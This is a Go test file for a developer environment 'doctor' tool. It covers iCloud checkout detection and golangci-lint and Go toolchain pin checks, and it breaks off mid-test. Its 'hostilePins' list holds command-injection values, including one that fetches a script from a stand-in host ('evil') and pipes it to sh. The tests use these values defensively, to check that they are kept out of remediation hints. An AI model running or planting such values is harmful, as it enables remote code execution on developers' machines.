package main

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"
)

// The host-environment rungs' seams are package vars, so none of these tests
// may run in parallel.

// envRunFunc is the doctorEnvRunOutput signature.
type envRunFunc func(timeout time.Duration, dir, name string, arg ...string) (string, error)

// withFakeDoctorEnvRunOutput stubs doctorEnvRunOutput for the test.
func withFakeDoctorEnvRunOutput(t *testing.T, fn envRunFunc) {
	t.Helper()
	orig := doctorEnvRunOutput
	doctorEnvRunOutput = fn
	t.Cleanup(func() { doctorEnvRunOutput = orig })
}

// withFakeDoctorReadFile stubs doctorReadFile for the test.
func withFakeDoctorReadFile(t *testing.T, fn func(string) ([]byte, error)) {
	t.Helper()
	orig := doctorReadFile
	doctorReadFile = fn
	t.Cleanup(func() { doctorReadFile = orig })
}

// withFakeDoctorUserHomeDir stubs doctorUserHomeDir for the test.
func withFakeDoctorUserHomeDir(t *testing.T, fn func() (string, error)) {
	t.Helper()
	orig := doctorUserHomeDir
	doctorUserHomeDir = fn
	t.Cleanup(func() { doctorUserHomeDir = orig })
}

// withFakeDoctorGOOS pins doctorGOOS for the test.
func withFakeDoctorGOOS(t *testing.T, goos string) {
	t.Helper()
	orig := doctorGOOS
	doctorGOOS = goos
	t.Cleanup(func() { doctorGOOS = orig })
}

// withFakeDoctorNumCPU pins doctorNumCPU for the test.
func withFakeDoctorNumCPU(t *testing.T, n int) {
	t.Helper()
	orig := doctorNumCPU
	doctorNumCPU = func() int { return n }
	t.Cleanup(func() { doctorNumCPU = orig })
}

// errNotFound is what exec reports for a binary absent from PATH.
func errNotFound(name string) error {
	return &exec.Error{Name: name, Err: exec.ErrNotFound}
}

// mustMkdir / mustWrite are fixture helpers.
func mustMkdir(t *testing.T, path string) {
	t.Helper()
	if err := os.MkdirAll(path, 0o755); err != nil {
		t.Fatal(err)
	}
}

func mustWrite(t *testing.T, path, body string) {
	t.Helper()
	mustMkdir(t, filepath.Dir(path))
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

// assertRung checks status and a detail substring, and that a warn carries a
// remediation containing every wantRemedy substring.
func assertRung(t *testing.T, got checkResult, wantStatus, wantDetail string, wantRemedy ...string) {
	t.Helper()
	if got.status != wantStatus {
		t.Fatalf("status = %q, want %q; detail=%q remediate=%q", got.status, wantStatus, got.detail, got.remediate)
	}
	if !strings.Contains(got.detail, wantDetail) {
		t.Errorf("detail = %q, want it to contain %q", got.detail, wantDetail)
	}
	if wantStatus == "warn" && got.remediate == "" {
		t.Errorf("warn with an empty remediation; detail=%q", got.detail)
	}
	if wantStatus == "ok" && got.remediate != "" {
		t.Errorf("ok with a remediation %q", got.remediate)
	}
	for _, r := range wantRemedy {
		if !strings.Contains(got.remediate, r) {
			t.Errorf("remediate = %q, want it to contain %q", got.remediate, r)
		}
	}
}

// ---------------------------------------------------------------------------
// checkout root / common dir
// ---------------------------------------------------------------------------

func TestDoctorCheckoutRoot_UsesGitToplevel(t *testing.T) {
	top := t.TempDir()
	withFakeDoctorEnvRunOutput(t, func(time.Duration, string, string, ...string) (string, error) {
		return top, nil
	})
	want, _ := filepath.EvalSymlinks(top)
	if got := doctorCheckoutRoot(t.TempDir()); got != want {
		t.Errorf("doctorCheckoutRoot = %q, want git's toplevel %q", got, want)
	}
}

func TestDoctorCheckoutRoot_FallsBackToWorkingDir(t *testing.T) {
	wd := t.TempDir()
	want, _ := filepath.EvalSymlinks(wd)
	for name, stub := range map[string]envRunFunc{
		"git error": func(time.Duration, string, string, ...string) (string, error) {
			return "", errors.New("fatal: not a git repository")
		},
		"relative output": func(time.Duration, string, string, ...string) (string, error) {
			return ".", nil
		},
	} {
		t.Run(name, func(t *testing.T) {
			withFakeDoctorEnvRunOutput(t, stub)
			if got := doctorCheckoutRoot(wd); got != want {
				t.Errorf("doctorCheckoutRoot = %q, want the absolute working dir %q", got, want)
			}
		})
	}
	t.Run("empty working dir is the cwd", func(t *testing.T) {
		withFakeDoctorEnvRunOutput(t, func(time.Duration, string, string, ...string) (string, error) {
			return "", errors.New("no git")
		})
		cwd, _ := os.Getwd()
		cwd, _ = filepath.EvalSymlinks(cwd)
		if got := doctorCheckoutRoot(""); got != cwd {
			t.Errorf("doctorCheckoutRoot(\"\") = %q, want cwd %q", got, cwd)
		}
	})
}

func TestDoctorGitCommonDir(t *testing.T) {
	dir := resolvedTempDir(t)
	file := filepath.Join(dir, "a-file")
	mustWrite(t, file, "x")
	cases := []struct {
		name string
		out  string
		err  error
		want string
	}{
		{"absolute dir", dir, nil, dir},
		{"git error", "", errors.New("not a repo"), ""},
		{"relative (an existing dir under the cwd)", ".", nil, ""},
		{"missing", filepath.Join(dir, "nope"), nil, ""},
		{"not a dir", file, nil, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			withFakeDoctorEnvRunOutput(t, func(time.Duration, string, string, ...string) (string, error) {
				return tc.out, tc.err
			})
			if got := doctorGitCommonDir(dir); got != tc.want {
				t.Errorf("doctorGitCommonDir = %q, want %q", got, tc.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// checkout location
// ---------------------------------------------------------------------------

// resolvedTempDir is t.TempDir() with symlinks resolved (macOS's /var ->
// /private/var), matching the real paths the rungs compare and render.
func resolvedTempDir(t *testing.T) string {
	t.Helper()
	dir, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	return dir
}

// iCloudFixture is a fake home + checkout + git common dir.
type iCloudFixture struct {
	home, root, common string
	noCommon           bool // git cannot name a common dir
}

// newICloudFixture builds a checkout at <home>/<rel> (rel "" puts it outside
// home) with a common dir at <root>/.git holding refs/heads/main.
func newICloudFixture(t *testing.T, rel string) iCloudFixture {
	t.Helper()
	home := resolvedTempDir(t)
	root := filepath.Join(resolvedTempDir(t), "proj")
	if rel != "" {
		root = filepath.Join(home, rel)
	}
	common := filepath.Join(root, ".git")
	mustWrite(t, filepath.Join(common, "refs", "heads", "main"), "0000\n")
	mustMkdir(t, filepath.Join(common, "objects", "pack"))
	return iCloudFixture{home: home, root: root, common: common}
}

// stub wires darwin, the fake home, git answering the fixture's root/common,
// and find answering via findFn (nil = no dataless files).
func (f iCloudFixture) stub(t *testing.T, findFn func(args []string) (string, error)) {
	t.Helper()
	withFakeDoctorGOOS(t, "darwin")
	withFakeDoctorUserHomeDir(t, func() (string, error) { return f.home, nil })
	withFakeDoctorEnvRunOutput(t, func(_ time.Duration, _ string, name string, args ...string) (string, error) {
		switch name {
		case "git":
			switch args[len(args)-1] {
			case "--show-toplevel":
				return f.root, nil
			case "--git-common-dir":
				if f.noCommon {
					return "", errors.New("fatal: not a git repository")
				}
				return f.common, nil
			}
		case "find":
			if findFn != nil {
				return findFn(args)
			}
			return "", nil
		}
		return "", fmt.Errorf("unexpected command %s %v", name, args)
	})
}

// cloudDocsMarker creates the CloudDocs/<name> entry: "symlink" to the home
// folder, "dir" a real directory, "elsewhere" a symlink to another folder.
func cloudDocsMarker(t *testing.T, home, name, kind string) {
	t.Helper()
	cloud := filepath.Join(home, "Library", "Mobile Documents", "com~apple~CloudDocs")
	mustMkdir(t, cloud)
	marker := filepath.Join(cloud, name)
	switch kind {
	case "symlink":
		if err := os.Symlink(filepath.Join(home, name), marker); err != nil {
			t.Fatal(err)
		}
	case "dir":
		mustMkdir(t, marker)
	case "elsewhere":
		if err := os.Symlink(t.TempDir(), marker); err != nil {
			t.Fatal(err)
		}
	case "dangling":
		if err := os.Symlink(filepath.Join(home, "gone"), marker); err != nil {
			t.Fatal(err)
		}
	}
}

func TestCheckICloudCheckout_SkippedOffMacOS(t *testing.T) {
	withFakeDoctorGOOS(t, "linux")
	withFakeDoctorEnvRunOutput(t, func(_ time.Duration, _ string, name string, args ...string) (string, error) {
		t.Errorf("non-darwin must not exec anything; got %s %v", name, args)
		return "", nil
	})
	assertRung(t, checkICloudCheckout(t.TempDir()), "ok", "skipped — not macOS")
}

func TestCheckICloudCheckout_CleanOK(t *testing.T) {
	f := newICloudFixture(t, "")
	f.stub(t, nil)
	got := checkICloudCheckout(f.root)
	assertRung(t, got, "ok", "proj")
	if strings.Contains(got.detail, "could not check") || strings.Contains(got.detail, "not detected") {
		t.Errorf("clean checkout carries a note: %q", got.detail)
	}
}

func TestCheckICloudCheckout_SyncedFolderWithMarkerWarns(t *testing.T) {
	for _, folder := range []string{"Documents", "Desktop"} {
		t.Run(folder, func(t *testing.T) {
			f := newICloudFixture(t, filepath.Join(folder, "proj"))
			cloudDocsMarker(t, f.home, folder, "symlink")
			f.stub(t, nil)
			assertRung(t, checkICloudCheckout(f.root), "warn", "under ~/"+folder+", which iCloud Desktop & Documents sync mirrors",
				"~/Projects/<repo>", "git worktree repair", "turn off iCloud Desktop & Documents sync")
		})
	}
}

func TestCheckICloudCheckout_SyncedFolderWithoutMarkerOK(t *testing.T) {
	for _, kind := range []string{"none", "dir", "elsewhere", "dangling"} {
		t.Run(kind, func(t *testing.T) {
			f := newICloudFixture(t, filepath.Join("Documents", "proj"))
			if kind != "none" {
				cloudDocsMarker(t, f.home, "Documents", kind)
			}
			f.stub(t, nil)
			assertRung(t, checkICloudCheckout(f.root), "ok", "under ~/Documents but iCloud Desktop & Documents sync not detected")
		})
	}
}

func TestCheckICloudCheckout_HomeUnresolvableIsNoSignal(t *testing.T) {
	f := newICloudFixture(t, filepath.Join("Documents", "proj"))
	cloudDocsMarker(t, f.home, "Documents", "symlink")
	f.stub(t, nil)
	withFakeDoctorUserHomeDir(t, func() (string, error) { return "", errors.New("$HOME is not defined") })
	assertRung(t, checkICloudCheckout(f.root), "ok", "proj")
}

func TestCheckICloudCheckout_ConflictCopyWarns(t *testing.T) {
	f := newICloudFixture(t, "")
	mustWrite(t, filepath.Join(f.common, "refs", "heads", "main 2"), "1111\n")
	f.stub(t, nil)
	assertRung(t, checkICloudCheckout(f.root), "warn", "1 iCloud conflict cop(ies) beside their originals: "+filepath.Join(".git", "refs", "heads", "main 2"),
		"remove `* N` copies only after diffing each against its original")
}

// TestCheckICloudCheckout_ConflictCopyScanDirs pins every scanned directory —
// including the common dir's objects/pack (binding condition 1) — one at a
// time, so dropping any one scan turns exactly its row RED.
func TestCheckICloudCheckout_ConflictCopyScanDirs(t *testing.T) {
	const sha = "0123456789abcdef0123456789abcdef01234567"
	cases := []struct {
		name     string
		original string
		copy     string
		dir      func(f iCloudFixture) string
	}{
		{"checkout top level", "go.work", "go 2.work", func(f iCloudFixture) string { return f.root }},
		{"common dir top level", "packed-refs", "packed-refs 2", func(f iCloudFixture) string { return f.common }},
		{"objects/pack", "pack-" + sha + ".pack", "pack-" + sha + " 2.pack", func(f iCloudFixture) string {
			return filepath.Join(f.common, "objects", "pack")
		}},
		{"nested refs", "feature", "feature 3", func(f iCloudFixture) string {
			return filepath.Join(f.common, "refs", "remotes", "origin")
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := newICloudFixture(t, "")
			dir := tc.dir(f)
			mustWrite(t, filepath.Join(dir, tc.original), "x")
			mustWrite(t, filepath.Join(dir, tc.copy), "x")
			f.stub(t, nil)
			assertRung(t, checkICloudCheckout(f.root), "warn", tc.copy)
		})
	}
	t.Run("empty conflict-copy directory counts", func(t *testing.T) {
		f := newICloudFixture(t, "")
		mustMkdir(t, filepath.Join(f.common, "refs", "tags"))
		mustMkdir(t, filepath.Join(f.common, "refs", "tags 2"))
		f.stub(t, nil)
		assertRung(t, checkICloudCheckout(f.root), "warn", "tags 2")
	})
}

func TestCheckICloudCheckout_UnrelatedNumberedNameNotFlagged(t *testing.T) {
	f := newICloudFixture(t, "")
	mustWrite(t, filepath.Join(f.root, "Chapter 2.md"), "x")
	mustWrite(t, filepath.Join(f.common, "refs", "heads", "release 2"), "x")
	f.stub(t, nil)
	assertRung(t, checkICloudCheckout(f.root), "ok", "proj")
}

func TestCheckICloudCheckout_ConflictScanTruncationIsNoted(t *testing.T) {
	orig := doctorConflictScanLimit
	doctorConflictScanLimit = 2
	t.Cleanup(func() { doctorConflictScanLimit = orig })
	f := newICloudFixture(t, "")
	f.noCommon = true // only the checkout top level is scanned
	for _, n := range []string{"a", "b", "c"} {
		mustWrite(t, filepath.Join(f.root, n), "x")
	}
	f.stub(t, nil)
	assertRung(t, checkICloudCheckout(f.root), "ok", "conflict-copy scan stopped at 2 entries")

	t.Run("a scan within the budget is not noted", func(t *testing.T) {
		doctorConflictScanLimit = 100
		got := checkICloudCheckout(f.root)
		assertRung(t, got, "ok", "proj")
		if strings.Contains(got.detail, "stopped") {
			t.Errorf("an untruncated scan carries the truncation note: %q", got.detail)
		}
	})
}

// TestCheckICloudCheckout_NoCommonDirSkipsCommonScans: when git names no
// common dir, the common-dir scans (top level, objects/pack, refs/ and the
// objects/pack dataless find) must not run against cwd-relative paths. The
// test chdirs into a directory carrying a conflict pair at objects/pack so a
// relative scan WOULD find it.
func TestCheckICloudCheckout_NoCommonDirSkipsCommonScans(t *testing.T) {
	f := newICloudFixture(t, "")
	f.noCommon = true
	cwd := resolvedTempDir(t)
	mustWrite(t, filepath.Join(cwd, "objects", "pack", "pack-1.pack"), "x")
	mustWrite(t, filepath.Join(cwd, "objects", "pack", "pack-1 2.pack"), "x")
	mustWrite(t, filepath.Join(cwd, "refs", "heads", "main"), "x")
	mustWrite(t, filepath.Join(cwd, "refs", "heads", "main 2"), "x")
	t.Chdir(cwd)
	var finds []string
	f.stub(t, func(args []string) (string, error) {
		finds = append(finds, args[0])
		return "", nil
	})
	assertRung(t, checkICloudCheckout(f.root), "ok", "proj")
	if len(finds) != 1 || finds[0] != f.root {
		t.Errorf("want only the checkout find with no common dir, got %v", finds)
	}
}

// TestCheckICloudCheckout_AbsentScanDirsTolerated: a fresh or bare-ish common
// dir can lack objects/pack and refs/. os.ReadDir then returns no entries, so
// an absent directory contributes nothing — no signal, no note — and the scans
// after it still run.
func TestCheckICloudCheckout_AbsentScanDirsTolerated(t *testing.T) {
	t.Run("objects/pack and refs absent", func(t *testing.T) {
		f := newICloudFixture(t, "")
		for _, rel := range []string{"objects", "refs"} {
			if err := os.RemoveAll(filepath.Join(f.common, rel)); err != nil {
				t.Fatal(err)
			}
		}
		f.stub(t, nil)
		got := checkICloudCheckout(f.root)
		assertRung(t, got, "ok", "proj")
		if got.detail != f.root {
			t.Errorf("absent scan dirs must add no note: detail = %q, want %q", got.detail, f.root)
		}
	})
	t.Run("refs scan still runs after an absent objects/pack", func(t *testing.T) {
		f := newICloudFixture(t, "")
		if err := os.RemoveAll(filepath.Join(f.common, "objects")); err != nil {
			t.Fatal(err)
		}
		mustWrite(t, filepath.Join(f.common, "refs", "heads", "main 2"), "1111\n")
		f.stub(t, nil)
		assertRung(t, checkICloudCheckout(f.root), "warn", "1 iCloud conflict cop(ies) beside their originals: "+filepath.Join(".git", "refs", "heads", "main 2"))
	})
}

// TestCheckICloudCheckout_CheckoutScanIsTopLevelOnly: the checkout is scanned
// at its top level only (refs/ is the one recursive scan), and the refs walk
// never follows a symlinked directory.
func TestCheckICloudCheckout_CheckoutScanIsTopLevelOnly(t *testing.T) {
	f := newICloudFixture(t, "")
	f.noCommon = true
	mustWrite(t, filepath.Join(f.root, "docs", "notes.md"), "x")
	mustWrite(t, filepath.Join(f.root, "docs", "notes 2.md"), "x")
	f.stub(t, nil)
	assertRung(t, checkICloudCheckout(f.root), "ok", "proj")

	t.Run("refs walk does not follow a symlinked directory", func(t *testing.T) {
		g := newICloudFixture(t, "")
		outside := resolvedTempDir(t)
		mustWrite(t, filepath.Join(outside, "x"), "x")
		mustWrite(t, filepath.Join(outside, "x 2"), "x")
		if err := os.Symlink(outside, filepath.Join(g.common, "refs", "linked")); err != nil {
			t.Fatal(err)
		}
		g.stub(t, nil)
		assertRung(t, checkICloudCheckout(g.root), "ok", "proj")
	})
}

// TestCheckICloudCheckout_LinkedWorktreeCommonDirRendersAbsolute: a linked
// worktree's common dir sits outside the checkout, so its paths render
// absolute rather than as a ../ climb.
func TestCheckICloudCheckout_LinkedWorktreeCommonDirRendersAbsolute(t *testing.T) {
	f := newICloudFixture(t, "")
	f.common = filepath.Join(resolvedTempDir(t), "main.git")
	mustWrite(t, filepath.Join(f.common, "refs", "heads", "main"), "x")
	mustWrite(t, filepath.Join(f.common, "refs", "heads", "main 2"), "x")
	f.stub(t, nil)
	got := checkICloudCheckout(f.root)
	assertRung(t, got, "warn", filepath.Join(f.common, "refs", "heads", "main 2"))
	if strings.Contains(got.detail, "..") {
		t.Errorf("a path outside the checkout rendered relative: %q", got.detail)
	}
}

func TestICloudFolderSynced_UnresolvableSidesNeverMatch(t *testing.T) {
	home := resolvedTempDir(t) // no Documents, no CloudDocs marker
	if iCloudFolderSynced(home, "Documents") {
		t.Error("two failed resolutions must not compare equal")
	}
}

func TestCheckICloudCheckout_DatalessWarns(t *testing.T) {
	f := newICloudFixture(t, "")
	var findArgs [][]string
	f.stub(t, func(args []string) (string, error) {
		findArgs = append(findArgs, args)
		if args[0] == f.root {
			return filepath.Join(f.root, "go.sum") + "\n" + filepath.Join(f.root, "cli", "main.go"), nil
		}
		return "", nil
	})
	assertRung(t, checkICloudCheckout(f.root), "warn", "2 dataless (iCloud-evicted) file(s): go.sum, "+filepath.Join("cli", "main.go"),
		"find . -flags +dataless -type f -print0 | xargs -0 cat >/dev/null")
	if len(findArgs) != 2 || findArgs[1][0] != filepath.Join(f.common, "objects", "pack") {
		t.Errorf("want a checkout find and an objects/pack find, got %v", findArgs)
	}
	if !strings.Contains(strings.Join(findArgs[0], " "), "-prune") {
		t.Errorf("checkout find must prune .git and node_modules: %v", findArgs[0])
	}
}

func TestCheckICloudCheckout_DatalessOutputUsedDespiteFindError(t *testing.T) {
	f := newICloudFixture(t, "")
	f.stub(t, func(args []string) (string, error) {
		if args[0] == f.root {
			return "", nil
		}
		return filepath.Join(f.common, "objects", "pack", "pack-1.pack"), errors.New("exit status 1")
	})
	assertRung(t, checkICloudCheckout(f.root), "warn", "1 dataless")
}

func TestCheckICloudCheckout_FindErrorWithEmptyOutputNotASignal(t *testing.T) {
	f := newICloudFixture(t, "")
	f.stub(t, func([]string) (string, error) {
		return "", errors.New("find: -flags: unknown primary or operator")
	})
	assertRung(t, checkICloudCheckout(f.root), "ok", "could not check for dataless files: find: -flags: unknown primary")
}

func TestCheckICloudCheckout_ManyExamplesAreBounded(t *testing.T) {
	f := newICloudFixture(t, "")
	f.stub(t, func(args []string) (string, error) {
		if args[0] != f.root {
			return "", nil
		}
		var paths []string
		for i := 0; i < 5; i++ {
			paths = append(paths, filepath.Join(f.root, fmt.Sprintf("f%d", i)))
		}
		return strings.Join(paths, "\n"), nil
	})
	assertRung(t, checkICloudCheckout(f.root), "warn", "5 dataless (iCloud-evicted) file(s): f0, f1, f2, … (2 more)")
}

func TestPathWithin(t *testing.T) {
	base := t.TempDir()
	docs := filepath.Join(base, "Documents")
	mustMkdir(t, filepath.Join(docs, "proj"))
	mustMkdir(t, filepath.Join(base, "Documents2"))
	cases := []struct {
		child string
		want  bool
	}{
		{docs, true},
		{filepath.Join(docs, "proj"), true},
		{filepath.Join(base, "Documents2"), false},
		{base, false},
	}
	if pathWithin(filepath.Join(docs, "proj"), "Documents") {
		t.Error("a relative parent (empty or relative $HOME) must never match an absolute child")
	}
	for _, tc := range cases {
		if got := pathWithin(tc.child, docs); got != tc.want {
			t.Errorf("pathWithin(%q, %q) = %v, want %v", tc.child, docs, got, tc.want)
		}
	}
}

// ---------------------------------------------------------------------------
// golangci-lint pin
// ---------------------------------------------------------------------------

// pinRepo is a checkout dir with optional Dockerfile / go.work / go.mod bodies;
// git is stubbed out so the root falls back to the dir.
func pinRepo(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for rel, body := range files {
		mustWrite(t, filepath.Join(dir, filepath.FromSlash(rel)), body)
	}
	return dir
}

// stubTool answers git with "not a repo" and the named tool with out/err.
func stubTool(t *testing.T, tool, out string, err error) {
	t.Helper()
	withFakeDoctorEnvRunOutput(t, func(_ time.Duration, _ string, name string, args ...string) (string, error) {
		switch name {
		case "git":
			return "", errors.New("fatal: not a git repository")
		case tool:
			return out, err
		}
		return "", fmt.Errorf("unexpected command %s %v", name, args)
	})
}

const lintDockerfile = "# ARG GOLANGCI_LINT_VERSION=v9.9.9 (commented decoy)\nARG GO_VERSION=1.25.6\nARG GOLANGCI_LINT_VERSION=v2.8.0\n"

func TestCheckGolangciLintPin_NoDockerfileSkips(t *testing.T) {
	stubTool(t, "golangci-lint", "", errors.New("must not run"))
	assertRung(t, checkGolangciLintPin(pinRepo(t, nil)), "ok", "skipped — no golangci-lint pin in this checkout")
}

func TestCheckGolangciLintPin_CommentedArgIgnored(t *testing.T) {
	stubTool(t, "golangci-lint", "golangci-lint has version 9.9.9", nil)
	dir := pinRepo(t, map[string]string{"deploy/gate-image/Dockerfile": "FROM x\n  # ARG GOLANGCI_LINT_VERSION=v9.9.9\n"})
	assertRung(t, checkGolangciLintPin(dir), "ok", "skipped — no golangci-lint pin")
}

func TestCheckGolangciLintPin_MatchOK(t *testing.T) {
	for name, tc := range map[string]struct{ dockerfile, out string }{
		"bare version":    {lintDockerfile, "golangci-lint has version 2.8.0 built with go1.25.6 from abc on 2026-01-01"},
		"v-prefixed":      {lintDockerfile, "golangci-lint has version v2.8.0 built with go1.25.6"},
		"quoted ARG pin":  {"ARG GOLANGCI_LINT_VERSION=\"v2.8.0\"\n", "golangci-lint has version 2.8.0"},
		"CRLF Dockerfile": {"ARG GOLANGCI_LINT_VERSION=v2.8.0 \r\n", "golangci-lint has version 2.8.0"},
	} {
		t.Run(name, func(t *testing.T) {
			stubTool(t, "golangci-lint", tc.out, nil)
			dir := pinRepo(t, map[string]string{"deploy/gate-image/Dockerfile": tc.dockerfile})
			assertRung(t, checkGolangciLintPin(dir), "ok", "v2.8.0 (matches CI pin)")
		})
	}
}

func TestCheckGolangciLintPin_MismatchWarns(t *testing.T) {
	stubTool(t, "golangci-lint", "golangci-lint has version 2.13.2 built with go1.27.0", nil)
	dir := pinRepo(t, map[string]string{"deploy/gate-image/Dockerfile": lintDockerfile})
	assertRung(t, checkGolangciLintPin(dir), "warn", "local v2.13.2, CI pin v2.8.0",
		"in-loop lint can pass while CI's gofmt/lint goes red",
		"scripts/test lint --in-gate-image",
		"golangci-lint/v2.8.0/install.sh")
}

func TestCheckGolangciLintPin_NotOnPATHWarns(t *testing.T) {
	stubTool(t, "golangci-lint", "", errNotFound("golangci-lint"))
	dir := pinRepo(t, map[string]string{"deploy/gate-image/Dockerfile": lintDockerfile})
	assertRung(t, checkGolangciLintPin(dir), "warn", "not on PATH (CI pin v2.8.0)",
		"scripts/test lint --in-gate-image", "v2.8.0/install.sh")
}

func TestCheckGolangciLintPin_UnparseableWarns(t *testing.T) {
	t.Run("no error", func(t *testing.T) {
		stubTool(t, "golangci-lint", "something else entirely", nil)
		dir := pinRepo(t, map[string]string{"deploy/gate-image/Dockerfile": lintDockerfile})
		assertRung(t, checkGolangciLintPin(dir), "warn", "version unparseable (CI pin v2.8.0)", "--in-gate-image")
	})
	t.Run("with error", func(t *testing.T) {
		stubTool(t, "golangci-lint", "", errors.New("signal: killed"))
		dir := pinRepo(t, map[string]string{"deploy/gate-image/Dockerfile": lintDockerfile})
		assertRung(t, checkGolangciLintPin(dir), "warn", "version unparseable (CI pin v2.8.0): signal: killed")
	})
}

// hostilePins are ARG values dockerfileArgDefault keeps whole (no whitespace)
// that would be shell syntax if formatted into a copy-pasteable remedy.
var hostilePins = []string{
	"2.8.0;curl${IFS}evil/x|sh",
	"2.8.0$(id)",
	"2.8.0`id`",
	"2.8.0&&id",
	"2.8.0'$(id)'",
}

// TestCheckGolangciLintPin_HostilePinSkipped: a pin that is not vX.Y[.Z] skips
// the rung (ok) and none of its bytes reach the detail or the remedy. The
// local version matches the pin's version prefix and the mismatch path would
// warn with the pin in the install command, so the shape check is the only
// thing between the hostile ARG and the hint.
func TestCheckGolangciLintPin_HostilePinSkipped(t *testing.T) {
	for _, hostile := range hostilePins {
		for _, prefix := range []string{"", "v"} {
			pin := prefix + hostile
			t.Run(pin, func(t *testing.T) {
				stubTool(t, "golangci-lint", "golangci-lint has version 2.8.0", nil)
				dir := pinRepo(t, map[string]string{"deploy/gate-image/Dockerfile": "ARG GOLANGCI_LINT_VERSION=" + pin + "\n"})
				got := checkGolangciLintPin(dir)
				assertRung(t, got, "ok", "skipped — golangci-lint pin unparseable (deploy/gate-image/Dockerfile ARG GOLANGCI_LINT_VERSION is not vX.Y[.Z])")
				if strings.Contains(got.detail+got.remediate, hostile[len("2.8.0"):]) {
					t.Errorf("hostile pin bytes reached the output: detail=%q remediate=%q", got.detail, got.remediate)
				}
			})
		}
	}
}

func TestDockerfileArgDefault(t *testing.T) {
	data := []byte("# ARG GO_VERSION=0.0.1\nARG GO_VERSIONX=9\n  ARG\tGO_VERSION='1.25.6' # trailing\nARG GO_VERSION=2\n")
	if got := dockerfileArgDefault(data, "GO_VERSION"); got != "1.25.6" {
		t.Errorf("dockerfileArgDefault = %q, want the first non-comment default 1.25.6", got)
	}
	if got := dockerfileArgDefault(data, "MISSING"); got != "" {
		t.Errorf("dockerfileArgDefault(MISSING) = %q, want empty", got)
	}
}

// ---------------------------------------------------------------------------
// go toolchain pin
// ---------------------------------------------------------------------------

func TestCheckGoToolchainPin_NoDirectiveSkips(t *testing.T) {
	stubTool(t, "go", "", errors.New("must not run"))
	assertRung(t, checkGoToolchainPin(pinRepo(t, nil)), "ok", "skipped — no go.work or go.mod at the checkout root")
	dir := pinRepo(t, map[string]string{"go.mod": "module x\n// go 1.25.0 in a comment\n"})
	assertRung(t, checkGoToolchainPin(dir), "ok", "skipped — no go.work or go.mod")
}

func TestCheckGoToolchainPin_GoModFallback(t *testing.T) {
	stubTool(t, "go", "go version go1.26.3 darwin/arm64", nil)
	dir := pinRepo(t, map[string]string{
		"go.work": "use ./cli\n", // no directive -> fall back to go.mod
		"go.mod":  "module x\n\ngo 1.26 // workspace floor\n",
	})
	assertRung(t, checkGoToolchainPin(dir), "ok", "go1.26.3 (go.mod pin go 1.26)")
}

func TestCheckGoToolchainPin_EqualOK(t *testing.T) {
	stubTool(t, "go", "go version go1.26.9 linux/amd64", nil)
	dir := pinRepo(t, map[string]string{"go.work": "// comment\ngo 1.26.0\n\nuse ./cli\n", "go.mod": "module x\ngo 1.20\n"})
	assertRung(t, checkGoToolchainPin(dir), "ok", "go1.26.9 (go.work pin go 1.26.0)")
}

// TestCheckGoToolchainPin_NewerWarns is the go-toolchain-drift acceptance
// fixture: it carries NO Dockerfile, so the recommended toolchain comes from
// the go.work directive alone.
func TestCheckGoToolchainPin_NewerWarns(t *testing.T) {
	stubTool(t, "go", "go version go1.27.1 darwin/arm64", nil)
	dir := pinRepo(t, map[string]string{"go.work": "go 1.25.0\n"})
	got := checkGoToolchainPin(dir)
	assertRung(t, got, "warn", "local go1.27.1 newer than the go.work pin go 1.25.0",
		"go env -w GOTOOLCHAIN=go1.25.0", "red-line `scripts/test verify` on clean main while CI stays green")
	if strings.Contains(got.remediate, "--in-gate-image") {
		t.Errorf("a checkout without the gate image must not suggest --in-gate-image: %q", got.remediate)
	}
}

func TestCheckGoToolchainPin_NewerNamesGateImageGoVersion(t *testing.T) {
	stubTool(t, "go", "go version go1.27.1 darwin/arm64", nil)
	dir := pinRepo(t, map[string]string{"go.work": "go 1.25.0\n", "deploy/gate-image/Dockerfile": lintDockerfile})
	assertRung(t, checkGoToolchainPin(dir), "warn", "newer than the go.work pin",
		"go env -w GOTOOLCHAIN=go1.25.6", "scripts/test lint --in-gate-image")
}

func TestCheckGoToolchainPin_DirectiveWithoutPatchGetsDotZero(t *testing.T) {
	stubTool(t, "go", "go version go1.27.0 darwin/arm64", nil)
	dir := pinRepo(t, map[string]string{"go.work": "go 1.25\n"})
	assertRung(t, checkGoToolchainPin(dir), "warn", "pin go 1.25", "GOTOOLCHAIN=go1.25.0")
}

func TestCheckGoToolchainPin_GateImageWithoutGoVersionFallsBackToDirective(t *testing.T) {
	stubTool(t, "go", "go version go1.27.0 darwin/arm64", nil)
	dir := pinRepo(t, map[string]string{"go.work": "go 1.25.4\n", "deploy/gate-image/Dockerfile": "FROM x\n"})
	assertRung(t, checkGoToolchainPin(dir), "warn", "newer", "GOTOOLCHAIN=go1.25.4")
}

// TestCheckGoToolchainPin_HostileGoVersionFallsBackToDirective: a GO_VERSION
// that is not X.Y[.Z] is never formatted into a remedy; every remedy path
// (newer, older, not on PATH, unparseable) recommends the digit-constrained
// directive toolchain instead.
func TestCheckGoToolchainPin_HostileGoVersionFallsBackToDirective(t *testing.T) {
	paths := []struct {
		name, out string
		err       error
		remedy    string
	}{
		{"newer", "go version go1.27.1 darwin/arm64", nil, "GOTOOLCHAIN=go1.25.0"},
		{"older", "go version go1.24.3 darwin/arm64", nil, "upgrade Go to go1.25.0"},
		{"not on PATH", "", errNotFound("go"), "install Go 1.25.0 "},
		{"unparseable", "gibberish", nil, "GOTOOLCHAIN=go1.25.0`"},
	}
	for _, hostile := range hostilePins {
		for _, prefix := range []string{"", "go"} {
			for _, p := range paths {
				goVersion := prefix + strings.Replace(hostile, "2.8.0", "1.25.6", 1)
				t.Run(goVersion+"/"+p.name, func(t *testing.T) {
					stubTool(t, "go", p.out, p.err)
					dir := pinRepo(t, map[string]string{"go.work": "go 1.25.0\n",
						"deploy/gate-image/Dockerfile": "ARG GO_VERSION=" + goVersion + "\n"})
					got := checkGoToolchainPin(dir)
					assertRung(t, got, "warn", "go.work pin go 1.25.0", p.remedy)
